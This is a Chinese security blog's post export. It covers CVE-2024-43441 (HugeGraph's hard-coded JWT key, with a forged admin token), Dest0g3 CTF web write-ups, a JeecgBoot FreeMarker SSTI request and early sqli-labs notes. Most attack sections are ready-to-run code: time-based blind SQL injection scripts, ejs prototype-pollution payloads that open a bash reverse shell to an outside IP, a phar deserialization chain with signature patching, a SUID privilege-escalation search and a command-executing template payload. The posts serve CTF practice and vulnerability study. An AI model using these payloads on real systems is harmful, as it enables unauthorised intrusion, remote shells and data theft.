{"posts":[{"title":"Apache HugeGraph JWT Token密钥硬编码漏洞代码分析(CVE-2024-43441)","text":"test 漏洞成因及利用条件用户启用了认证但未配置auth.token_secret时，HugeGraph将使用一个硬编码的默认JWT密匙，默认密匙可以在官方文档中看到，其值为_FXQXbJtbCLxODc6tGci732pkH1cyf8Qg_。 JWT构造规则分析因为代码文件太多了，所以找JWT构造规则的时候会比较困难，所以，可以想到哪里会利用JWT的构造，就是登录的时候。 先找到LoginAPI，其中登录的部分 看到token构造的代码在这段里。 1234try { String token = manager.authManager().loginUser(jsonLogin.name, jsonLogin.password); HugeGraph g = graph(manager, graph); return manager.serializer(g).writeMap(ImmutableMap.of(&quot;token&quot;, token));} 然后可以跟进到GraphManager的authManager()方法中 123public AuthManager authManager() { return this.authenticator().authManager(); } 可以发现没有我们需要的信息，并且返回一堆函数的调用，所以继续跟进到authenticator() 123456private HugeAuthenticator authenticator() { E.checkState(this.authenticator != null, &quot;Unconfigured authenticator, please config &quot; + &quot;auth.authenticator option in rest-server.properties&quot;); return this.authenticator; } 该方法只是检查this.authenticator是否为空，如果为空就会抛出异常，不为空就重新返回authenticator。 所以跟进authManager().loginUser方法，在src/main/resources /StandardAuthManager.java中。 1234567891011121314151617public String loginUser(String username, String password) throws AuthenticationException { HugeUser user = this.matchUser(username, password); if (user == null) { String msg = &quot;Incorrect username or password&quot;; throw new AuthenticationException(msg); } Map&lt;String, ?&gt; payload = ImmutableMap.of(AuthConstant.TOKEN_USER_NAME, username, AuthConstant.TOKEN_USER_ID, user.id.asString()); String token = this.tokenGenerator.create(payload, this.tokenExpire); this.tokenCache.update(IdGenerator.of(token), username); return token; } 这段代码可以发现构造JWT中需要的一部分参数，AuthConstant.TOKEN_USER_NAME_以及_AuthConstant.TOKEN_USER_ID，进入AuthConstant接口，可以发现这俩个参数就是_user_name_以及_user_id_，还有一个_tokenExpire_ 参数，不确定是有什么作用。 继续跟进tokenGenerator.create，找到auth/TokenGenerator.java文件 1234567public String create(Map&lt;String, ?&gt; payload, long expire) { return Jwts.builder() .setClaims(payload) .setExpiration(new Date(System.currentTimeMillis() + expire)) .signWith(this.key, SignatureAlgorithm.HS256) .compact(); } 进而发现构造jwt的参数所需的全部条件。 Token构造分析用于用户认证的代码主要位于_org/apache/hugegraph/api/filter/AuthenticationFilter.java_中的authenticate方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980protected User authenticate(ContainerRequestContext context) { GraphManager manager = this.managerProvider.get(); E.checkState(manager != null, &quot;Context GraphManager is absent&quot;); if (!manager.requireAuthentication()) { // Return anonymous user with an admin role if disable authentication return User.ANONYMOUS; } // Get peer info Request request = this.requestProvider.get(); String peer = null; String path = null; if (request != null) { peer = request.getRemoteAddr() + &quot;:&quot; + request.getRemotePort(); path = request.getRequestURI(); } // Check whiteIp if (enabledWhiteIpCheck == null) { String whiteIpStatus = this.configProvider.get().get(WHITE_IP_STATUS); enabledWhiteIpCheck = Objects.equals(whiteIpStatus, STRING_ENABLE); } if (enabledWhiteIpCheck &amp;&amp; request != null) { peer = request.getRemoteAddr() + &quot;:&quot; + request.getRemotePort(); path = request.getRequestURI(); String remoteIp = request.getRemoteAddr(); Set&lt;String&gt; whiteIpList = manager.authManager().listWhiteIPs(); boolean whiteIpEnabled = manager.authManager().getWhiteIpStatus(); if (!path.contains(STRING_WHITE_IP_LIST) &amp;&amp; whiteIpEnabled &amp;&amp; !whiteIpList.contains(remoteIp)) { throw new ForbiddenException(String.format(&quot;Remote ip '%s' is not permitted&quot;, remoteIp)); } } Map&lt;String, String&gt; credentials = new HashMap&lt;&gt;(); // Extract authentication credentials String auth = context.getHeaderString(HttpHeaders.AUTHORIZATION); if (auth == null) { throw new NotAuthorizedException(&quot;Authentication credentials are required&quot;, &quot;Missing authentication credentials&quot;); } if (auth.startsWith(BASIC_AUTH_PREFIX)) { auth = auth.substring(BASIC_AUTH_PREFIX.length()); auth = new String(DatatypeConverter.parseBase64Binary(auth), Charsets.ASCII_CHARSET); String[] values = auth.split(&quot;:&quot;); if (values.length != 2) { throw new BadRequestException(&quot;Invalid syntax for username and password&quot;); } final String username = values[0]; final String password = values[1]; if (StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) { throw new BadRequestException(&quot;Invalid syntax for username and password&quot;); } credentials.put(HugeAuthenticator.KEY_USERNAME, username); credentials.put(HugeAuthenticator.KEY_PASSWORD, password); } else if (auth.startsWith(BEARER_TOKEN_PREFIX)) { String token = auth.substring(BEARER_TOKEN_PREFIX.length()); credentials.put(HugeAuthenticator.KEY_TOKEN, token); } else { throw new BadRequestException(&quot;Only HTTP Basic or Bearer authentication is supported&quot;); } credentials.put(HugeAuthenticator.KEY_ADDRESS, peer); credentials.put(HugeAuthenticator.KEY_PATH, path); // Validate the extracted credentials try { return manager.authenticate(credentials); } catch (AuthenticationException e) { throw new NotAuthorizedException(&quot;Authentication failed&quot;, e.getMessage()); } } 首先，是Http头的限制 1234567Map&lt;String, String&gt; credentials = new HashMap&lt;&gt;(); // Extract authentication credentials String auth = context.getHeaderString(HttpHeaders.AUTHORIZATION);if (auth == null) { throw new NotAuthorizedException(&quot;Authentication credentials are required&quot;, &quot;Missing authentication credentials&quot;); } 这里从AUTHORIZATION中拿出Token，限制了Http头要为AUTHORIZATION并且不为空。 然后开始判断token的开头 1234567891011121314151617181920212223if (auth.startsWith(BASIC_AUTH_PREFIX)) { auth = auth.substring(BASIC_AUTH_PREFIX.length()); auth = new String(DatatypeConverter.parseBase64Binary(auth), Charsets.ASCII_CHARSET); String[] values = auth.split(&quot;:&quot;); if (values.length != 2) { throw new BadRequestException(&quot;Invalid syntax for username and password&quot;); } final String username = values[0]; final String password = values[1]; if (StringUtils.isEmpty(username) || StringUtils.isEmpty(password)) { throw new BadRequestException(&quot;Invalid syntax for username and password&quot;); } credentials.put(HugeAuthenticator.KEY_USERNAME, username); credentials.put(HugeAuthenticator.KEY_PASSWORD, password); } else if (auth.startsWith(BEARER_TOKEN_PREFIX)) { String token = auth.substring(BEARER_TOKEN_PREFIX.length()); credentials.put(HugeAuthenticator.KEY_TOKEN, token); } else { throw new BadRequestException(&quot;Only HTTP Basic or Bearer authentication is supported&quot;); } 首先第一个if判断Authorization 头是否为Basic，如果为Basic就进行账号密码的原始字符串判断，所以开头不能为base。 第二种判断Authorization 头是否为Bearer，这种就是可以利用的JWT认证。 漏洞复现使用默认密匙构造jwt 按分析构造token 1Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiIsInVzZXJfaWQiOiJhZG1pbiIsImV4cCI6OTczOTUyNDU2N30.Kc_6-EtUz3J8lS9VZEfsEe4BFYz-GIg7SFFfGQ5VNeE 无token时,返回报错json 加入构造token。 !","link":"/2025/03/03/Apache%20HugeGraph%20JWT%20Token%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90(CVE-2024-43441)/"},{"title":"","text":"Dest0g3 520-web ezip–就是文件上传提权010打开涩图发现后面又base64 1234567891011121314151617181920dXBsb2FkLnBocDoKPD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwppbmNsdWRlKCJ6aXAucGhwIik7CmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7CiAgICBpZihzdHJzdHIoJF9GSUxFU1snZmlsZSddWyduYW1lJ10sIi4uIil8fHN0cnN0cigkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSwiLyIpKXsKICAgICAgICBlY2hvICJoYWNrZXIhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgIGlmKHBhdGhpbmZvKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddLCBQQVRISU5GT19FWFRFTlNJT04pIT0iemlwIil7CiAgICAgICAgZWNobyAib25seSB6aXAhISI7CiAgICAgICAgZXhpdDsKICAgIH0KICAgICRNeXppcCA9IG5ldyB6aXAoJF9GSUxFU1snZmlsZSddWyduYW1lJ10pOwogICAgbWtkaXIoJE15emlwLT5wYXRoKTsKICAgIG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICcuLycuJE15emlwLT5wYXRoLicvJyAuICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKTsKICAgIGVjaG8gIlRyeSB0byB1bnppcCB5b3VyIHppcCB0byAvIi4kTXl6aXAtPnBhdGguIjxicj4iOwogICAgaWYoJE15emlwLT51bnppcCgpKXtlY2hvICJTdWNjZXNzIjt9ZWxzZXtlY2hvICJmYWlsZWQiO30KfQoKemlwLnBocDoKPD9waHAKY2xhc3MgemlwCnsKICAgIHB1YmxpYyAkemlwX25hbWU7CiAgICBwdWJsaWMgJHBhdGg7CiAgICBwdWJsaWMgJHppcF9tYW5hZ2VyOwoKICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkemlwX25hbWUpewogICAgICAgICR0aGlzLT56aXBfbWFuYWdlciA9IG5ldyBaaXBBcmNoaXZlKCk7CiAgICAgICAgJHRoaXMtPnBhdGggPSAkdGhpcy0+Z2VuX3BhdGgoKTsKICAgICAgICAkdGhpcy0+emlwX25hbWUgPSAkemlwX25hbWU7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gZ2VuX3BhdGgoKXsKICAgICAgICAkY2hhcnM9ImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IjsKICAgICAgICAkbmV3Y2hhcnM9c3RyX3NwbGl0KCRjaGFycyk7CiAgICAgICAgc2h1ZmZsZSgkbmV3Y2hhcnMpOwogICAgICAgICRjaGFyc19rZXk9YXJyYXlfcmFuZCgkbmV3Y2hhcnMsMTUpOwogICAgICAgICRmbnN0ciA9ICIiOwogICAgICAgIGZvcigkaT0wOyRpPDE1OyRpKyspewogICAgICAgICAgICAkZm5zdHIuPSRuZXdjaGFyc1skY2hhcnNfa2V5WyRpXV07CiAgICAgICAgfQogICAgICAgIHJldHVybiBtZDUoJGZuc3RyLnRpbWUoKS5taWNyb3RpbWUoKSoxMDAwMDApOwogICAgfQoKICAgIHB1YmxpYyBmdW5jdGlvbiBkZWxkaXIoJGRpcikgewogICAgICAgIC8v5YWI5Yig6Zmk55uu5b2V5LiL55qE5paH5Lu277yaCiAgICAgICAgJGRoID0gb3BlbmRpcigkZGlyKTsKICAgICAgICB3aGlsZSAoJGZpbGUgPSByZWFkZGlyKCRkaCkpIHsKICAgICAgICAgICAgaWYoJGZpbGUgIT0gIi4iICYmICRmaWxlIT0iLi4iKSB7CiAgICAgICAgICAgICAgICAkZnVsbHBhdGggPSAkZGlyLiIvIi4kZmlsZTsKICAgICAgICAgICAgICAgIGlmKCFpc19kaXIoJGZ1bGxwYXRoKSkgewogICAgICAgICAgICAgICAgICAgIHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZGVsZGlyKCRmdWxscGF0aCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgY2xvc2VkaXIoJGRoKTsKICAgIH0KICAgIGZ1bmN0aW9uIGRpcl9saXN0KCRkaXJlY3RvcnkpCiAgICB7CiAgICAgICAgJGFycmF5ID0gW107CgogICAgICAgICRkaXIgPSBkaXIoJGRpcmVjdG9yeSk7CiAgICAgICAgd2hpbGUgKCRmaWxlID0gJGRpci0+cmVhZCgpKSB7CiAgICAgICAgICAgIGlmICgkZmlsZSAhPT0gJy4nICYmICRmaWxlICE9PSAnLi4nKSB7CiAgICAgICAgICAgICAgICAkYXJyYXlbXSA9ICRmaWxlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYXJyYXk7CiAgICB9CiAgICBwdWJsaWMgZnVuY3Rpb24gdW56aXAoKQogICAgewogICAgICAgICRmdWxscGF0aCA9ICIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiR0aGlzLT56aXBfbmFtZTsKICAgICAgICAkd2hpdGVfbGlzdCA9IFsnanBnJywncG5nJywnZ2lmJywnYm1wJ107CiAgICAgICAgJHRoaXMtPnppcF9tYW5hZ2VyLT5vcGVuKCRmdWxscGF0aCk7CiAgICAgICAgZm9yICgkaSA9IDA7JGkgPCAkdGhpcy0+emlwX21hbmFnZXItPmNvdW50KCk7JGkgKyspIHsKICAgICAgICAgICAgaWYgKHN0cnN0cigkdGhpcy0+emlwX21hbmFnZXItPmdldE5hbWVJbmRleCgkaSksIi4uLyIpKXsKICAgICAgICAgICAgICAgIGVjaG8gInlvdSBiYWQgYmFkIjsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZighJHRoaXMtPnppcF9tYW5hZ2VyLT5leHRyYWN0VG8oJHRoaXMtPnBhdGgpKXsKICAgICAgICAgICAgZWNobyAiVW56aXAgdG8gLyIuJHRoaXMtPnBhdGguIi8gZmFpbGVkIjsKICAgICAgICAgICAgZXhpdDsKICAgICAgICB9CiAgICAgICAgQHVubGluaygkZnVsbHBhdGgpOwogICAgICAgICRmaWxlX2xpc3QgPSAkdGhpcy0+ZGlyX2xpc3QoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIpOwogICAgICAgIGZvcigkaT0wOyRpPHNpemVvZigkZmlsZV9saXN0KTskaSsrKXsKICAgICAgICAgICAgaWYoaXNfZGlyKCR0aGlzLT5wYXRoLiIvIi4kZmlsZV9saXN0WyRpXSkpewogICAgICAgICAgICAgICAgZWNobyAiZGlyPyBJIGRlbGV0ZWQgYWxsIHRoaW5ncyBpbiBpdCIuIjxicj4iO0AkdGhpcy0+ZGVsZGlyKCIvdmFyL3d3dy9odG1sLyIuJHRoaXMtPnBhdGguIi8iLiRmaWxlX2xpc3RbJGldKTtAcm1kaXIoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICBpZighaW5fYXJyYXkocGF0aGluZm8oJGZpbGVfbGlzdFskaV0sIFBBVEhJTkZPX0VYVEVOU0lPTiksJHdoaXRlX2xpc3QpKSB7ZWNobyAib25seSBpbWFnZSEhISBJIGRlbGV0ZWQgaXQgZm9yIHlvdSIuIjxicj4iO0B1bmxpbmsoIi92YXIvd3d3L2h0bWwvIi4kdGhpcy0+cGF0aC4iLyIuJGZpbGVfbGlzdFskaV0pO30KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gdHJ1ZTsKCiAgICB9CgoKfQo=#upload.php:&lt;?phperror_reporting(0);include(&quot;zip.php&quot;);if(isset($_FILES['file']['name'])){ if(strstr($_FILES['file']['name'],&quot;..&quot;)||strstr($_FILES['file']['name'],&quot;/&quot;)){ echo &quot;hacker!!&quot;; exit; } if(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION)!=&quot;zip&quot;){ echo &quot;only zip!!&quot;; exit; } $Myzip = new zip($_FILES['file']['name']); mkdir($Myzip-&gt;path); move_uploaded_file($_FILES['file']['tmp_name'], './'.$Myzip-&gt;path.'/' . $_FILES['file']['name']); echo &quot;Try to unzip your zip to /&quot;.$Myzip-&gt;path.&quot;&lt;br&gt;&quot;; if($Myzip-&gt;unzip()){echo &quot;Success&quot;;}else{echo &quot;failed&quot;;}} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#zip.php:&lt;?phpclass zip{ public $zip_name; public $path; public $zip_manager; public function __construct($zip_name){ $this-&gt;zip_manager = new ZipArchive(); $this-&gt;path = $this-&gt;gen_path(); $this-&gt;zip_name = $zip_name; } public function gen_path(){ $chars=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;; $newchars=str_split($chars); shuffle($newchars); $chars_key=array_rand($newchars,15); $fnstr = &quot;&quot;; for($i=0;$i&lt;15;$i++){ $fnstr.=$newchars[$chars_key[$i]]; } return md5($fnstr.time().microtime()*100000); } public function deldir($dir) { //先删除目录下的文件： $dh = opendir($dir); while ($file = readdir($dh)) { if($file != &quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) { $fullpath = $dir.&quot;/&quot;.$file; if(!is_dir($fullpath)) { unlink($fullpath); } else { $this-&gt;deldir($fullpath); } } } closedir($dh); } function dir_list($directory) { $array = []; $dir = dir($directory); while ($file = $dir-&gt;read()) { if ($file !== '.' &amp;&amp; $file !== '..') { $array[] = $file; } } return $array; } public function unzip() { $fullpath = &quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$this-&gt;zip_name; $white_list = ['jpg','png','gif','bmp']; $this-&gt;zip_manager-&gt;open($fullpath); for ($i = 0;$i &lt; $this-&gt;zip_manager-&gt;count();$i ++) { if (strstr($this-&gt;zip_manager-&gt;getNameIndex($i),&quot;../&quot;)){ echo &quot;you bad bad&quot;; return false; } } if(!$this-&gt;zip_manager-&gt;extractTo($this-&gt;path)){ echo &quot;Unzip to /&quot;.$this-&gt;path.&quot;/ failed&quot;; exit; } @unlink($fullpath); $file_list = $this-&gt;dir_list(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;); for($i=0;$i&lt;sizeof($file_list);$i++){ if(is_dir($this-&gt;path.&quot;/&quot;.$file_list[$i])){ echo &quot;dir? I deleted all things in it&quot;.&quot;&lt;br&gt;&quot;;@$this-&gt;deldir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);@rmdir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]); } else{ if(!in_array(pathinfo($file_list[$i], PATHINFO_EXTENSION),$white_list)) {echo &quot;only image!!! I deleted it for you&quot;.&quot;&lt;br&gt;&quot;;@unlink(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);} } } return true; }} 创建一个不能解压的压缩包 这里解压失败 但是解压后部分文件后直接exit 从而绕过后续的unlink /4df1bef9d0c0ef26403ff10f6f431309/she.php 发现权限不够，于是提权 1find / -user root -perm -4000 -print 2&gt;/dev/null nl有可读权限 1nl /f* phpdest123456&lt;?php highlight_file(__FILE__); require_once 'flag.php'; if(isset($_GET['file'])) { require_once($_GET['file']); } 1?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php ​ easysql跑脚本即可 1234567891011121314151617181920212223242526272829303132import requestsimport timeurl=&quot;http://32a96c02-6636-425a-b16a-047c7164e64d.node5.buuoj.cn:81/&quot;def SQL_injection(): res=&quot;&quot; for i in range(1,100): mid=32 while mid&lt;128: #payload=&quot;'||if(ascii(mid((database()),%d,1))=%d,benchmark(2500000,sha(1)),0)||'&quot;%(i,mid) #database()=ctf #payload=&quot;'||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #flaggg,user #payload=&quot;'||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='flaggg')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #cmd payload=&quot;'||if(ascii(mid((select(cmd)from(flaggg)),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) print(payload) begin_time=time.time() data={&quot;username&quot;:payload, &quot;password&quot;:&quot;test&quot;} r=requests.post(url=url, data=data) end_time=time.time() #print(end_time-begin_time) if (end_time-begin_time)&gt;1: res+=chr(mid) break mid+=1 if(mid==128): break print(res) print(res)if __name__==&quot;__main__&quot;: SQL_injection() Really Easy SQL先试一下有没有过滤 发现输入什么都是报错 直接时间盲注吧 1234567891011121314151617181920212223242526272829import requestsimport timeurl=&quot;http://a521de12-f1b9-42f6-b179-2f488565741b.node5.buuoj.cn:81/&quot;def SQL_injection(): res=&quot;&quot; # 外层循环：遍历字符位置（1到99，假设flag长度不超过99） for i in range(4,100): mid=32 # 内层循环：遍历当前位置的可能ASCII码（32-127，覆盖所有可见字符） while mid&lt;128: #payload=&quot;'||if(ascii(mid((database()),%d,1))=%d,benchmark(2500000,sha(1)),0)||'&quot;%(i,mid) #database()=ctf #payload=&quot;'||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #flaggg,user #payload=&quot;'||if(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='flaggg')),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) #cmd payload=&quot;'||if(ascii(mid((select(cmd)from(flaggg)),%d,1))=%d,benchmark(3000000,sha(1)),0)||'&quot;%(i,mid) print(payload) begin_time=time.time() data={&quot;username&quot;:payload, &quot;password&quot;:&quot;test&quot;} r=requests.post(url=url, data=data) end_time=time.time() #print(end_time-begin_time) if (end_time-begin_time)&gt;1: res+=chr(mid) break mid+=1 if(mid==128): break print(res) print(res) if __name__==&quot;__main__&quot;: SQL_injection() 服务器一直卡爆换for循环参数注入 1flag{790b46b0-7256-4c78-96be-2f2d043c3132} NodeSoEasy 用的ejs模板 /目录下存在原型链污染 eJS RCE 1{&quot;__proto__&quot;:{&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load('child_process').execSync('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/124.222.136.33/1337 0&gt;&amp;1\\&quot;');&quot;,&quot;compileDebug&quot;:true}} 发包用application/json 参考：https://www.anquanke.com/post/id/236354 BUU弹不了shell 暂时没招解决 1234567891011121314POST / HTTP/1.1Host: 9339894c-2cec-42a6-a9f6-b8017abf9468.node5.buuoj.cn:81Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh,zh-CN;q=0.9Connection: keep-aliveReferer: http://9339894c-2cec-42a6-a9f6-b8017abf9468.node5.buuoj.cn:81/Content-Type: application/jsonContent-Length: 145{&quot;__proto__&quot;:{&quot;client&quot;:{},&quot;escapeFunction&quot;:&quot;1; require('child_process').exec('bash -i &gt;&amp; /dev/tcp/10.88.15.15/1337 0&gt;&amp;1');&quot;,&quot;compileDebug&quot;:true}} PharPOP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phphighlight_file(__FILE__);function waf($data){ if (is_array($data)){ die(&quot;Cannot transfer arrays&quot;); } // i表示大小写不敏感 if (preg_match('/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i', $data)) { die(&quot;You can't do&quot;); }}class air{ public $p; public function __set($p, $value) { $p = $this-&gt;p-&gt;act; echo new $p($value); }}class tree{ public $name; public $act; public function __destruct() { return $this-&gt;name(); } public function __call($name, $arg){ $arg[1] =$this-&gt;name-&gt;$name; }}class apple { public $xxx; public $flag; public function __get($flag) { $this-&gt;xxx-&gt;$flag = $this-&gt;flag; }}class D { public $start; public function __destruct(){ $data = $_POST[0]; if ($this-&gt;start == 'w') { waf($data); $filename = &quot;/tmp/&quot;.md5(rand()).&quot;.jpg&quot;; file_put_contents($filename, $data); echo $filename; } else if ($this-&gt;start == 'r') { waf($data); $f = file_get_contents($data); if($f){ echo &quot;It is file&quot;; } else{ echo &quot;You can look at the others&quot;; } } }}class banana { public function __get($name){ return $this-&gt;$name; }}// flag in ///入口：POST[1]长度&lt;55则反序列化if(strlen($_POST[1]) &lt; 55) { $a = unserialize($_POST[1]);}else{ echo &quot;str too long&quot;;}throw new Error(&quot;start&quot;);?&gt; 1tree._destruct-&gt;tree._call-&gt;apple._get-&gt;air._set 然后绕过throw，throw会阻碍析构函数进行，通过gc垃圾回收提前触发析构函数 绕过waf，waf过滤了很多关键字，使用gzip命令处理phar文件 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpclass air{ public $p;} class tree{ public $name; public $act;} class apple { public $xxx; public $flag;} $a = new tree;$b = new apple;$c = new air;$d = new tree;// $d-&gt;act='FilesystemIterator';// $c-&gt;p = $d;// $b-&gt;xxx = $c;// $b-&gt;flag = 'glob:///*f*';// $a-&gt;name = $b;$d-&gt;act='SplFileObject';$c-&gt;p = $d;$b-&gt;xxx = $c;$b-&gt;flag = &quot;/fflaggg&quot;;$a-&gt;name = $b; $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件,随便新建一个文件内容随意$phar-&gt;stopBuffering(); 生成的phar文件在010editor中打开，删去最后一个} 修改签名并压缩phar文件 123456from hashlib import sha1f = open('phar.phar', 'rb').read() # 修改内容后的phar文件s = f[:-28] # 获取要签名的数据h = f[-8:] # 获取签名类型以及GBMB标识newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMBopen('fixed_phar.phar', 'wb').write(newf) # 写入新文件 运行项目并下载源码 以url编码形式输出文件内容 123456import urllib.parse with open(&quot;fixed_phar.phar.gz&quot;, 'rb') as fi: f = fi.read() ff = urllib.parse.quote(f) #获取信息 print(ff) 运行项目并下载源码 写入phar文件 10=%1F%8B%08%08%7C%22%1Df%00%03fixed_phar.phar%00s%F7t%B3%B0L%B4%B1/%C8%28P%88%8F%F7p%F4%09%89w%F6%F7%0D%F0%F4q%0D%D2%D0%B4V%B0%B7%E3%E5z%C8%C0%C0%C0%08%C4%82P%9A%81a5%10%FB%5B%99X%29%95%14%A5%A6%2AY%19YU%17%83xy%89%B9%A9J%D6%FEV%A6VJ%89%05%0590%19c%2B%A5%8A%8A%0A%90%04%90%95%98Y%A4de%08%126%B4R%2A%00%09%E20%C6%CF%1A%AC31%B9D%09%C82%042%83%0Br%DC2sR%FD%93%B2RA%82%B5%B5%60%D5i9%89%E9%20%15%16VJ%FAi%20N%3A%90%5B%8B%D0%EBg%CD%01tmIjq%89%5EIE%09%0B%C8%F9%8A%B2i%20%9A%A7%AE%FE%C66%88%87%C0%F2%CBO%CC%FE%BAh%E5%FC%1B%B2%AD%C9%1A%B7.8%19O%EC9%26%C9%04%94sw%F2u%02%00%15%9D%B7%24%27%01%00%00&amp;1=O:1:&quot;D&quot;:2:{s:5:&quot;start&quot;;s:1:&quot;w&quot;;} 运行项目并下载源码 phar协议读文件操作触发phar反序列化拿flag 10=phar:///tmp/96c72754133e4a4d55d0baee6bfdb66a.jpg&amp;1=O:1:&quot;D&quot;:2:{s:5:&quot;start&quot;;s:1:&quot;r&quot;;} 运行项目并下载源码","link":"/2025/12/11/Dest0g3%20520-web/"},{"title":"","text":"JeecgBoot jmreport/loadTableData 接口 SSTI 漏洞–CVE-2023-41544 1234567891011POST /jmreport/queryFieldBySql HTTP/1.1Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Content-Length: 95Accept: */*Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/json{&quot;sql&quot;:&quot;select '&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt; ${ ex(\\&quot;pwd\\&quot;) }' &quot;} 漏洞原理12345678910111213141516171819//传参String userInputSql = request.getParam(&quot;sql&quot;); //初始化FreeMarker配置Configuration freeMarkerCfg = new Configuration(Configuration.VERSION_2_3_31);//默认配置未禁用危险类解析// freeMarkerCfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);//输入的sql作为FreeMarker模板内容Template template = new Template( &quot;sqlTemplate&quot;, new StringReader(userInputSql), //用户输入的sql直接作为模板内容 freeMarkerCfg);//渲染模板（输入的sql中的FreeMarker指令被执行）String renderedContent = FreeMarkerTemplateUtils.processTemplateIntoString(template, null);executeSql(renderedContent); 实例化Execute类，得到可执行命令的ex对象 执行${ex(&quot;ls&quot;)}：调用ex执行ls命令，获取服务器上ls的执行结果","link":"/2025/12/13/JeecgBoot%20jmreportloadTableDataSSTI%20%E6%BC%8F%E6%B4%9E--CVE-2023-41544/"},{"title":"","text":"sqllibas打靶记录 1.什么是注入？注入就是通过SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终到达服务器执行恶意的SQL代码，从而进一步得到相应的数据信息 构造一条精巧的语句，来查询到想要得到的信息。 2.注入有哪几种分类按照查询字段 按照注入的方式：union注入，报错注入，布尔注入，时间注入 3.什么是注入点注入点就是可以实行注入的地方，通常是一个访问数据库的连接。如本页面注入点input the ID 4.如何判断是以什么类型注入如何判断是字符型还是数字型方法一：and 1=1和and 1=2来判断 